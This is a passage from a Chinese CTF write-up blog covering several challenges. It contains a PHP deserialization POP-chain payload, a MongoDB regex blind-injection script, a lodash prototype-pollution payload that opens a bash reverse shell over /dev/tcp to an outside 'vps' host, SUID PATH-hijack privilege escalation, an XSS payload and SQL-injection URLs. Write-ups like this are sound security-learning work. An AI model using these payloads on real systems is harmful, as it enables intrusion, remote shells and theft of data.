privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§çš„å€¼æ—¶</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;       <span class="comment">//PHP get_classå‡½æ•° â€”â€”è¿”å›å¯¹è±¡æ‰€å±çš„ç±»å</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">        <span class="comment">// $this-&gt;p = &quot;phpinfo&quot;;  //å±æ€§ä¸å­˜åœ¨,è§¦å‘getæ–¹æ³•</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="string">&quot;getFlag&quot;</span>;  <span class="comment">//å±æ€§ä¸å­˜åœ¨,è§¦å‘getæ–¹æ³•</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;      <span class="comment">//å±æ€§ï¼Œå¯¹åº”A</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// if(isset($_GET[&#x27;pop&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//     $pop = $_GET[&#x27;pop&#x27;];</span></span><br><span class="line"><span class="comment">//     $o = unserialize($pop);</span></span><br><span class="line"><span class="comment">//     throw new Exception(&quot;no pop&quot;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$aaa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>([<span class="variable">$aaa</span>,<span class="number">1</span>]);</span><br><span class="line"><span class="comment">// echo $zzz;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$yyy</span> = <span class="string">&#x27;O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:3:&quot;xxx&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:9:&quot;Funfunc&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// unserialize($yyy);</span></span><br><span class="line"><span class="variable">$zzz</span> = <span class="string">&#x27;a:2:&#123;i:0;O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;i:1;i:1;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// unserialize($zzz);</span></span><br><span class="line"><span class="comment">//æŸ¥çœ‹phpinfo()   åˆ©ç”¨Funç±»çš„call_user_funcè°ƒç”¨function</span></span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:9:&quot;Funfunc&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;   </span></span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line"><span class="comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;i:1;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¿®æ”¹<code>O:3:&quot;Fun&quot;:1:</code>ä¸º<code>O:3:&quot;Fun&quot;:2:</code>æ¥ç»•è¿‡wakeup</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903203124039.png" alt="image-20220903203124039"></p><h2 id="EzNode1"><a href="#EzNode1" class="headerlink" title="EzNode1"></a>EzNode1</h2><p>dirsearchæ‰«æ,&#x2F;loginè·¯ç”±æœ‰ç™»å½•ç•Œé¢</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904023404296.png" alt="image-20220904023404296"></p><p>f12æŸ¥çœ‹æºç ï¼Œæç¤ºç”¨æˆ·å</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904013052754.png" alt="image-20220904013052754"></p><p>ä½¿ç”¨Wappalyzerï¼Œæºç ä¸ºnodejs</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904085718385.png" alt="image-20220904085718385"></p><p>æ‰¾åˆ°ä¸€ä¸ªMongodbæ³¨å…¥ï¼Œç»“åˆregx</p><p><a href="https://www.secpulse.com/archives/3278.html">Mongodbæ³¨å…¥æ”»å‡» - SecPulse.COM | å®‰å…¨è„‰æ</a></p><p><a href="https://www.secpulse.com/archives/1916.html">HCTF2014 Writeup - SecPulse.COM | å®‰å…¨è„‰æ</a></p><p>å‘ç°äº†ä¸€ä¸ªä¸ä¸€æ ·çš„å›æ˜¾ï¼Œpasswordçš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904023623922.png" alt="image-20220904023623922"></p><p>æ ¹æ®<code>Are You Kidding Me?</code>ç»“åˆMongodbå’Œregexæ³¨å…¥æ”»å‡»å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(string.printable)</span><br><span class="line"><span class="built_in">str</span> = string.ascii_lowercase+string.ascii_uppercase+string.digits+<span class="string">&#x27;~!@#$%^()_&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        data1 = <span class="string">&quot;username=administrator&amp;password[$regex]=^&quot;</span> + result + i</span><br><span class="line">        <span class="built_in">print</span>(data1)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url = <span class="string">&quot;http://3000.endpoint-15446f1451474a1ab020eac1131fbdea.dasc.buuoj.cn:81/login&quot;</span>,headers=headers,data = data1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(r.text))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;Kidding&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="built_in">print</span>(result + i)</span><br><span class="line">            result = result + i</span><br><span class="line"></span><br><span class="line"><span class="comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;thejs.session=s%3AB2nvBGFBBl6FtWWKzZjlNhZsYD4z9zyV.CB%2BIX6xIxKv%2Bw%2FFHAIb1MKBRn5olbtsmcaSlrV1zNXo&#x27;,&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;</span></span><br><span class="line"><span class="comment"># r = requests.post(url=&quot;http://3000.endpoint-e1d7ac3bc3ad4e4e939925ec0ce1bc4e.dasc.buuoj.cn:81/login&quot;,data=&quot;username=administrator&amp;password[$regex]=^1&quot;)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904024228986.png" alt="image-20220904024228986"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">tHe_pAsSw0rd_thAt_y0u_NeVer_Kn0w</span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥å¯†ç ï¼Œç™»å½•</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904024458658.png" alt="image-20220904024458658"></p><p>&#x2F;sourceæŸ¥çœ‹æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://localhost/ctf&#x27;</span>, &#123; <span class="attr">useNewUrlParser</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>));</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">admin</span> === <span class="literal">undefined</span> || req.<span class="property">session</span>.<span class="property">admin</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// login</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/home&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">data</span> !== <span class="literal">undefined</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">data</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">real_name</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">realname</span>,</span><br><span class="line">            <span class="attr">age</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">age</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">real_name</span>: <span class="string">&#x27;Undefined&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>: <span class="string">&#x27;Undefined&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// update your info</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/update&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;update.ejs&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;<span class="attr">realname</span>: <span class="string">&#x27;&#x27;</span>, <span class="attr">age</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        data = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>);</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">realname</span>) &#123;</span><br><span class="line">          res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span>;</span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listening on http://%s:%s&quot;</span>, host, port);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>lodash.mergeåŸå‹é“¾æ±¡æŸ“</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904025029642.png" alt="image-20220904025029642"></p><p>æ‰¾ä¸€ä¸ªpayload</p><p><a href="https://www.viewofthai.link/2022/04/22/lodash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">lodashåŸå‹é“¾æ±¡æŸ“ â€“ View of Thai</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904025332243.png" alt="image-20220904025332243"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">tHe_pAsSw0rd_thAt_y0u_NeVer_Kn0w</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps/7002 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨postmanå‘åŒ…ï¼Œè¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904073919262.png" alt="image-20220904073919262"></p><p>ææƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line">/home/bunny</span><br></pre></td></tr></table></figure><p>å‘ç°&#x2F;home&#x2F;bunny</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904073244718.png" alt="image-20220904073244718"></p><p>æ ¹æ®&#x2F;home&#x2F;bunnyçš„å›æ˜¾ï¼Œæ¨æµ‹æ˜¯ç”¨äº†idå‘½ä»¤ï¼Œæƒ³åŠæ³•æ›¿æ¢idå‘½ä»¤</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904074238796.png" alt="image-20220904074238796"></p><p>ä½†æ˜¯æ— è®ºæ˜¯æ›¿æ¢ï¼Œè¿˜æ˜¯åˆ é™¤ï¼Œæƒé™éƒ½ä¸å¤Ÿ</p><p>åæ¥å‘ç°ï¼Œå¯ä»¥ä½¿ç”¨exportæ¥è®¾ç½®PATHçš„ç¯å¢ƒå˜é‡ï¼Œå°†PATHè®¾ç½®ä¸ºtmpç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œidå‘½ä»¤çš„æ—¶å€™ï¼Œä¼šä¼˜å…ˆåˆ°tmpç›®å½•å¯»æ‰¾å¹¶æ‰§è¡Œå‘½ä»¤</p><p>åœ¨tmpç›®å½•ä¸‹æ„é€ æ¶æ„çš„idå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; /tmp/id</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/id</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œ&#x2F;home&#x2F;bunny</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904082059141.png" alt="image-20220904082059141"></p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 2022 </tag>
            
            <tag> ç¾ŠåŸæ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHELLCTF2022å¤ç°</title>
      <link href="/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SHELLCTF2022å¤ç°"><a href="#SHELLCTF2022å¤ç°" class="headerlink" title="SHELLCTF2022å¤ç°"></a>SHELLCTF2022å¤ç°</h1><h2 id="Choosy"><a href="#Choosy" class="headerlink" title="Choosy"></a>Choosy</h2><blockquote><p>Single solution doesnâ€™t works on all problems. One should try different solutions for different problem.</p><p>Flag format:- shellctf{H3re_1s_tH3_F14g}</p><p><a href="http://20.125.142.38:8324/">http://20.125.142.38:8324</a></p><p>Alternate link <a href="http://20.193.247.209:8333/">http://20.193.247.209:8333/</a></p></blockquote><p>è¿™ä¸ªæ‰“å¼€ä¹‹åæ˜¯è¿™æ ·çš„</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505854105.png" alt="img"></p><p>åŠŸèƒ½æ˜¯è¾“å…¥å¤§å†™å­—æ¯ï¼Œè¿”å›å°å†™å­—æ¯ï¼Œæ•°å­—å’Œå­—ç¬¦ä¸å˜ã€‚æœ¬æ¥æ˜¯æƒ³çš„æ˜¯SSTIï¼Œä½†æ˜¯æ€ä¹ˆå°è¯•ä¹Ÿä¸è¡Œï¼Œçœ‹äº†wpæ‰çŸ¥é“æ˜¯xss</p><p>è¿™ä¸ªä¼šè§£æhtmlæ ‡ç­¾ï¼Œä½†æ˜¯ä¼šè¿‡æ»¤scriptï¼Œå¯ä»¥ä½¿ç”¨imgæ ‡ç­¾</p><p>onerrorï¼Œåœ¨åŠ è½½å›¾ç‰‡é”™è¯¯æ—¶æ‰§è¡Œjavascript</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855106.png" alt="img"></p><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855107.png" alt="img"></p><h2 id="Colour-Cookie"><a href="#Colour-Cookie" class="headerlink" title="Colour Cookie"></a>Colour Cookie</h2><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Gone those days when no colours, images, fonts use to be on a webpage. We now have various ways to decorate our webpages and here is one such example.</p><p>Flag format :- shellctf{H3re_1s_F14g}</p><p><a href="http://20.125.142.38:8326/">http://20.125.142.38:8326</a></p><p><a href="http://20.193.247.209:8222/">http://20.193.247.209:8222/</a></p></blockquote><p>åœ¨&#x2F;static&#x2F;base_cookie.cssä¸­æ‰¾åˆ°</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*   name=&quot;C0loR&quot;  */</span></span><br></pre></td></tr></table></figure><p>å¹¶ä¸”é¢˜ç›®æç¤º<code>Blue is my favourite colour</code>ï¼Œä½†æ˜¯å—é¢˜ç›®åç§°å½±å“ï¼Œåœ¨cookieä¸Šä¸‹å·¥å¤«äº†ï¼Œæƒ³åäº†</p><p>æ­£è§£åº”è¯¥æ˜¯ä¼ å‚<code>C0loR=Blue</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8326/check?C0loR=Blue</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855108.png" alt="img"></p><h2 id="Extractor"><a href="#Extractor" class="headerlink" title="Extractor"></a>Extractor</h2><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>We are under emergency. Enemy is ready with its nuclear weapon we need to activate our gaurds but chief who had password is dead. There is portal at URL below which holds key within super-user account, can you get the key and save us.</p><p>Flag format :- shellctf{H3re_1s_tH3_fL4G}</p><p><a href="http://20.125.142.38:8956/">http://20.125.142.38:8956</a></p><p>Alternate URL :- <a href="http://20.193.247.209:8555/">http://20.193.247.209:8555/</a></p><p>More Alternate URL :- <a href="http://52.66.29.74:8999/">http://52.66.29.74:8999/</a></p></blockquote><p>æœ‰æ³¨å†Œå’Œç™»å½•ä¸¤ä¸ªåŠŸèƒ½</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855109.png" alt="img"></p><p>ä½†æ˜¯æˆ‘æµ‹è¯•çš„æ—¶å€™ï¼Œå³ä½¿ä¸æ³¨å†Œï¼Œä¹Ÿå¯ä»¥ç™»å½•æˆåŠŸï¼Œä¸è¿‡è¿”å›çš„ä¿¡æ¯ä¸ºç©ºï¼Œå¦‚ä¸‹</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855110.png" alt="img"></p><p>æ­£å¸¸æ³¨å†Œç™»å½•ï¼Œå°±ä¼šè¿”å›ç”¨æˆ·æ³¨å†Œçš„ç›¸å…³ä¿¡æ¯</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855111.png" alt="img"></p><p>åŒæ—¶æ³¨æ„urlçš„å˜åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8956/profile?username=555&amp;pass=555&amp;content=555</span></span><br></pre></td></tr></table></figure><p>è¿›è¡Œsqlæ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8956/profile?username=555%27--+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855112.png" alt="img"></p><p>åˆ¤æ–­å­—æ®µæ•°ä¸º4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855113.png" 